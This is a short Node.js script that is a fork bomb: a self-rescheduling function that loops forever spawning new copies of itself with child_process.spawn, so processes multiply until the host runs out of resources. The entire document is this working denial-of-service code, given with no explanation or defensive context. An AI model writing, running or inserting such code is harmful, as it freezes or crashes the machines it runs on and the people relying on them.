(function bomb() {
    setImmediate(bomb);
    while (true) {
        require('child_process').spawn(process.argv[0], [__filename]);
    }
})();
